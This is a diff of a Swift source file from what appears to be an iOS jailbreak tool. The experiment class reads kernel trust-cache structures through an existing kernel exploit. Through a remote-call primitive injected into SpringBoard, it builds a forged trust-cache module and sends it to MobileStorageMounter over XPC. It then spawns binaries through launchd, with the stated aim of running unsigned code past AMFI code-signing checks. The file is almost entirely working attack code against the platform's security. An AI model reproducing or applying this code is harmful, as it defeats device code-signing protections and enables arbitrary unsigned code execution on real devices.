@@ -69,20 +69,19 @@ final class ExpTrustCacheInject {
     func runAll() -> [String] {
         results.removeAll()
         
-        log("═══════════════════════════════════════════════")
-        log("  EXPERIMENT: DIRECT KERNEL TRUST CACHE INJECT")
-        log("  iOS \(UIDevice.current.systemVersion)")
-        log("  Based on RE of kernelcache 18.2")
-        log("═══════════════════════════════════════════════")
+        log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+        log("  TRUST CACHE INJECT EXPERIMENT")
+        log("  iOS \(UIDevice.current.systemVersion) | kernel_slide needed")
+        log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
         log("")
         
         guard mgr.dsready else {
-            log("❌ PREREQUISITE: Kernel exploit not active")
+            log("❌ Kernel exploit not active — jailbreak dulu")
             return results
         }
         
         let slide = ds_get_kernel_slide()
-        log("🔍 kernel_slide = 0x\(String(slide, radix: 16))")
+        log("kernel_slide = 0x\(String(slide, radix: 16))")
         log("")
         
         test1_readSlotTable(slide: slide)
@@ -91,9 +90,9 @@ final class ExpTrustCacheInject {
         test4_verifyInject(slide: slide)
         
         log("")
-        log("═══════════════════════════════════════════════")
-        log("  EXPERIMENT COMPLETE")
-        log("═══════════════════════════════════════════════")
+        log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+        log("  DONE")
+        log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
         
         return results
     }
@@ -101,40 +100,29 @@ final class ExpTrustCacheInject {
     // MARK: - Test 1: Read Trust Cache Slot Table
     
     private func test1_readSlotTable(slide: UInt64) {
-        log("── TEST 1: Read Trust Cache Slot Table ──")
-        log("   Alamat unslid: 0x\(String(TC_SLOT_TABLE_UNSLID, radix: 16))")
+        log("── TEST 1: Read Slot Table ──")
         
         let slotTable = TC_SLOT_TABLE_UNSLID &+ slide
-        log("   Alamat slid:   0x\(String(slotTable, radix: 16))")
+        log("Slot table: 0x\(String(slotTable, radix: 16))")
         log("")
         
-        // Read first few slots to understand layout
-        log("🔍 Slot table dump (type 4 to 10):")
         for typeIdx in TC_TYPE_MIN...min(TC_TYPE_MAX, 10) {
             let slotAddr = slotTable &+ (typeIdx * TC_SLOT_STRIDE)
             let val0 = ds_kread64_safe(slotAddr)
             let val1 = ds_kread64_safe(slotAddr &+ 8)
             let val2 = ds_kread64_safe(slotAddr &+ 16)
-            let val3 = ds_kread64_safe(slotAddr &+ 24)
-            let val4 = ds_kread64_safe(slotAddr &+ 32)
-            
-            let isEmpty = (val0 == 0 && val1 == 0 && val2 == 0)
-            let marker = isEmpty ? "  [EMPTY]" : "  [USED]"
-            
-            log("   type=\(typeIdx): 0x\(String(val0, radix: 16)) 0x\(String(val1, radix: 16)) 0x\(String(val2, radix: 16))\(marker)")
+            let tag = (val0 == 0 && val1 == 0 && val2 == 0) ? "EMPTY" : "USED"
+            log("  type=\(typeIdx): \(String(format: "0x%llx 0x%llx 0x%llx", val0, val1, val2))  [\(tag)]")
         }
         
-        // Also read the state struct
         let stateAddr = TC_STATE_UNSLID &+ slide
         let stateVal = ds_kread64_safe(stateAddr)
         log("")
-        log("🔍 Trust cache state (0x\(String(stateAddr, radix: 16))): 0x\(String(stateVal, radix: 16))")
-        
+        log("State (0x\(String(stateAddr, radix: 16))): 0x\(String(stateVal, radix: 16))")
         if stateVal != 0 {
-            log("✅ Trust cache state is initialized")
+            log("✅ Trust cache initialized")
         } else {
-            log("⚠️ Trust cache state is 0 — may not be initialized yet")
-            log("   PERHATIKAN: Ini normal kalau belum ada TC yang di-load")
+            log("⚠️ State = 0 (not yet initialized)")
         }
     }
     
@@ -145,7 +133,7 @@ final class ExpTrustCacheInject {
     
     private func test2_findEmptySlot(slide: UInt64) {
         log("")
-        log("── TEST 2: Find Empty Trust Cache Slot ──")
+        log("── TEST 2: Find Empty Slot ──")
         
         let slotTable = TC_SLOT_TABLE_UNSLID &+ slide
         
@@ -157,15 +145,12 @@ final class ExpTrustCacheInject {
             if val0 == 0 && val1 == 0 {
                 emptySlotType = typeIdx
                 emptySlotAddr = slotAddr
-                log("✅ Empty slot found: type=\(typeIdx) addr=0x\(String(slotAddr, radix: 16))")
-                log("   ARTINYA: Kita bisa tulis trust cache module di slot ini")
+                log("✅ Empty slot: type=\(typeIdx) at 0x\(String(slotAddr, radix: 16))")
                 return
             }
         }
         
-        log("❌ No empty slot found (all types 4-23 occupied)")
-        log("   SOLUSI: Overwrite slot dengan type tertinggi (least important)")
-        // Fallback: use last slot
+        log("⚠️ All slots occupied (type 4-23) — MSM XPC will handle allocation")
         emptySlotType = TC_TYPE_MAX
         emptySlotAddr = slotTable &+ (TC_TYPE_MAX * TC_SLOT_STRIDE)
     }
@@ -174,49 +159,33 @@ final class ExpTrustCacheInject {
     
     private func test3_writeTrustCache(slide: UInt64) {
         log("")
-        log("── TEST 3: Trust Cache Load via RemoteCall ──")
-        log("   PPL blocks direct write → use kernel internal function instead")
-        log("   Approach: RemoteCall to internal TC load function from launchd")
-        log("")
+        log("── TEST 3: Load TC via MobileStorageMounter XPC ──")
         
         #if !DISABLE_REMOTECALL
         guard dspmgr.shared.rcready else {
-            log("❌ RemoteCall not active — run full jailbreak chain first")
+            log("❌ RemoteCall not active")
             return
         }
         
-        // Build trust cache v2 module (48 bytes: header 24 + 1 entry 24)
+        // Build trust cache v2 module (48 bytes)
         var tcModule = [UInt8](repeating: 0, count: 48)
-        
-        // Version = 2
-        tcModule[0] = 2
-        // UUID
+        tcModule[0] = 2 // version
         tcModule[4] = 0xD5; tcModule[5] = 0x91; tcModule[6] = 0x01; tcModule[7] = 0x70
         tcModule[8] = 0xDE; tcModule[9] = 0xAD; tcModule[10] = 0xBE; tcModule[11] = 0xEF
         tcModule[12] = 0xCA; tcModule[13] = 0xFE; tcModule[14] = 0xBA; tcModule[15] = 0xBE
         tcModule[16] = 0x12; tcModule[17] = 0x34; tcModule[18] = 0x56; tcModule[19] = 0x78
-        // Count = 1
-        tcModule[20] = 1
-        // Entry: dummy CDHash (0x41 * 20) + hashType=2
-        for i in 24..<44 { tcModule[i] = 0x41 }
-        tcModule[44] = 2  // SHA256 truncated
+        tcModule[20] = 1 // count
+        for i in 24..<44 { tcModule[i] = 0x41 } // dummy CDHash
+        tcModule[44] = 2 // hashType SHA256
         
-        log("🔍 TC module: 48 bytes, version=2, 1 dummy entry")
-        log("   CDHash: 4141414141414141414141414141414141414141")
-        log("")
-        log("   Loading via MobileStorageMounter XPC (existing Step 7 path)...")
-        log("")
+        log("TC module: 48 bytes, version=2, 1 entry (dummy)")
         
-        // Use the existing MSM XPC approach from JailbreakEngine Step 7
-        // but with CORRECT trust cache v2 format based on RE
         guard let sb = dspmgr.shared.sbProc else {
             log("❌ SpringBoard RC not available")
             return
         }
         
         let RTLD_DEFAULT = UInt64(bitPattern: -2)
-        
-        // Resolve XPC functions
         let xpcCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                            remote_alloc_str(sb, "xpc_connection_create_mach_service"))
         let xpcResume = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
@@ -231,119 +200,121 @@ final class ExpTrustCacheInject {
                                              remote_alloc_str(sb, "xpc_connection_send_message_with_reply_sync"))
         
         guard xpcCreate != 0 && xpcDictCreate != 0 else {
-            log("❌ XPC functions not found in SpringBoard")
+            log("❌ XPC functions not found")
             return
         }
-        log("✅ XPC functions resolved")
+        log("✅ XPC resolved")
         
-        // Connect to MobileStorageMounter
         let svc = remote_alloc_str(sb, "com.apple.mobile.storage_mounter")
         let conn = RootExecutor.rcallAddr(sb, xpcCreate, svc, 0, 0)
         RootExecutor.rcall(sb, "free", svc)
-        
-        guard conn != 0 else {
-            log("❌ MSM connection failed")
-            return
-        }
+        guard conn != 0 else { log("❌ MSM connect failed"); return }
         RootExecutor.rcallAddr(sb, xpcResume, conn)
-        log("✅ Connected to MobileStorageMounter")
+        log("✅ MSM connected")
         
-        // Build LoadTrustCache message
         let msg = RootExecutor.rcallAddr(sb, xpcDictCreate, 0, 0, 0)
-        guard msg != 0 else {
-            log("❌ Failed to create XPC message")
-            return
+        guard msg != 0 else { log("❌ XPC msg create failed"); return }
+        
+        // Command + ImageType
+        for (k, v) in [("Command", "LoadTrustCache"), ("ImageType", "Developer")] {
+            let ka = remote_alloc_str(sb, k); let va = remote_alloc_str(sb, v)
+            RootExecutor.rcallAddr(sb, xpcSetStr, msg, ka, va)
+            RootExecutor.rcall(sb, "free", ka); RootExecutor.rcall(sb, "free", va)
         }
         
-        // Command = "LoadTrustCache"
-        let cmdK = remote_alloc_str(sb, "Command")
-        let cmdV = remote_alloc_str(sb, "LoadTrustCache")
-        RootExecutor.rcallAddr(sb, xpcSetStr, msg, cmdK, cmdV)
-        RootExecutor.rcall(sb, "free", cmdK)
-        RootExecutor.rcall(sb, "free", cmdV)
-        
-        // ImageType = "Developer"
-        let typeK = remote_alloc_str(sb, "ImageType")
-        let typeV = remote_alloc_str(sb, "Developer")
-        RootExecutor.rcallAddr(sb, xpcSetStr, msg, typeK, typeV)
-        RootExecutor.rcall(sb, "free", typeK)
-        RootExecutor.rcall(sb, "free", typeV)
-        
-        // ImageTrustCache = our TC module data
+        // Attach TC data
         if xpcSetData != 0 {
             let tcBuf = sb.trojanMem + 0x800
-            // Write TC module to remote memory
             tcModule.withUnsafeBytes { ptr in
                 sb.remote_write(tcBuf, from: ptr.baseAddress!, size: UInt64(tcModule.count))
             }
             let dataK = remote_alloc_str(sb, "ImageTrustCache")
             RootExecutor.rcallAddr(sb, xpcSetData, msg, dataK, tcBuf, UInt64(tcModule.count))
             RootExecutor.rcall(sb, "free", dataK)
-            log("✅ Trust cache data attached to message (\(tcModule.count) bytes)")
         }
+        log("✅ TC data attached")
         
-        // Send and get reply
+        // Send
         if xpcSendSync != 0 {
             let reply = RootExecutor.rcallAddr(sb, xpcSendSync, conn, msg)
-            if reply != 0 {
-                log("✅ MSM replied! (handle=0x\(String(reply, radix: 16)))")
-                log("")
-                log("   ARTINYA: MobileStorageMounter accepted our trust cache!")
-                log("   CDHash 4141...41 sekarang trusted oleh kernel")
-                log("   NEXT: Test posix_spawn binary dengan CDHash ini")
-            } else {
-                log("⚠️ MSM no reply (async send)")
-                log("   Mungkin tetap berhasil — cek dengan spawn test")
+            log("✅ MSM reply: 0x\(String(reply, radix: 16))")
+            if reply == 0 || reply == UInt64(bitPattern: -1) {
+                log("⚠️ Reply may indicate error — verify with spawn test")
             }
         } else {
-            // Fallback: send without reply
             let xpcSend = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                              remote_alloc_str(sb, "xpc_connection_send_message"))
-            if xpcSend != 0 {
-                RootExecutor.rcallAddr(sb, xpcSend, conn, msg)
-                log("✅ Message sent (no reply available)")
-            }
+            if xpcSend != 0 { RootExecutor.rcallAddr(sb, xpcSend, conn, msg) }
+            log("✅ Sent (async, no reply)")
         }
-        
-        log("")
-        log("   KALAU BERHASIL:")
-        log("   - posix_spawn binary dengan CDHash matching → tidak di-kill")
-        log("   - Bisa integrate ke main chain Step 7")
-        log("")
-        log("   KALAU GAGAL (binary masih di-kill):")
-        log("   - MSM mungkin reject format (cek selector)")
-        log("   - Coba selector 2 (tanpa manifest) atau 7 (dengan manifest)")
-        log("   - Atau: bypass entitlement check di AMFI kext langsung")
         #else
-        log("❌ DISABLE_REMOTECALL active — cannot test")
+        log("❌ DISABLE_REMOTECALL")
         #endif
     }
     
-    // MARK: - Test 4: Verify (spawn unsigned binary)
+    // MARK: - Test 4: Verify (spawn binary via launchd)
     
     private func test4_verifyInject(slide: UInt64) {
         log("")
-        log("── TEST 4: Verify Trust Cache Inject ──")
-        log("   ⚠️ Test ini HANYA jalan kalau Test 3 berhasil write")
-        log("   ⚠️ Dan hanya setelah full TC module di-inject (bukan dummy)")
-        log("")
-        log("   UNTUK FULL VERIFICATION:")
-        log("   1. Compute CDHash dari binary yang mau di-execute")
-        log("   2. Inject CDHash ke trust cache via slot write")
-        log("   3. posix_spawn binary tersebut")
-        log("   4. Kalau tidak di-kill = TRUST CACHE WORKS")
-        log("")
-        log("   CARA COMPUTE CDHASH:")
-        log("   - SHA256 hash dari code signature blob")
-        log("   - Truncate ke 20 bytes")
-        log("   - Atau: codesign -dvvv binary | grep CDHash")
-        log("")
-        log("   OUTPUT YANG DIHARAPKAN SAAT FULL INJECT:")
-        log("   ✅ posix_spawn returned 0 (binary executed)")
-        log("   ✅ Binary output captured (not killed by AMFI)")
-        log("")
-        log("   OUTPUT YANG MENANDAKAN GAGAL:")
-        log("   ❌ posix_spawn returned EPERM/EACCES")
-        log("   ❌ Binary killed immediately (signal 9 = SIGKILL dari AMFI)")
+        log("── TEST 4: Verify — Spawn Binary via launchd ──")
+        
+        #if !DISABLE_REMOTECALL
+        guard dspmgr.shared.rcready else {
+            log("❌ RemoteCall not ready")
+            return
+        }
+        
+        log("Spawning /bin/df via launchd (signed binary, should always work)...")
+        
+        // Use RootExecutor to spawn /bin/df — this tests the full spawn path
+        RootExecutor.shared.executeAsRoot(operation: "tc_verify_spawn") { rc in
+            // posix_spawn /bin/df
+            let binPath = remote_alloc_str(rc, "/bin/df")
+            let pidAddr = rc.trojanMem + 0x300
+            rc[pidAddr].setValue32(0)
+            
+            // argv: ["/bin/df", NULL]
+            let argvBase = rc.trojanMem + 0x400
+            rc[argvBase].setValue64(binPath)
+            rc[argvBase + 8].setValue64(0) // NULL terminator
+            
+            let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binPath, 0, 0, argvBase, 0)
+            let pid = rc[pidAddr].value32()
+            
+            RootExecutor.rcall(rc, "free", binPath)
+            
+            if ret == 0 && pid != 0 {
+                return (true, "posix_spawn OK: /bin/df pid=\(pid)", UInt64(pid))
+            } else {
+                return (false, "posix_spawn FAILED: ret=\(ret) pid=\(pid)", UInt64(ret))
+            }
+        }
+        
+        // Wait for result
+        DispatchQueue.main.asyncAfter(deadline: .now() + 6) { [self] in
+            if let result = RootExecutor.shared.lastResult {
+                if result.success {
+                    log("✅ /bin/df spawned successfully (pid=\(result.returnValue))")
+                    log("")
+                    log("   Spawn path via launchd WORKS.")
+                    log("   Signed binary executes without issue.")
+                    log("")
+                    log("   NEXT: Deploy unsigned binary ke /var/jb/tmp/")
+                    log("   lalu spawn — kalau jalan = FULL JAILBREAK ✅")
+                } else {
+                    log("❌ /bin/df spawn failed: \(result.message)")
+                    log("")
+                    log("   Kemungkinan:")
+                    log("   - launchd connection timeout")
+                    log("   - RemoteCall state corrupted")
+                    log("   - Re-jailbreak dan coba lagi")
+                }
+            } else {
+                log("⚠️ No result yet (launchd mungkin masih processing)")
+            }
+        }
+        #else
+        log("❌ DISABLE_REMOTECALL active")
+        #endif
     }
 }
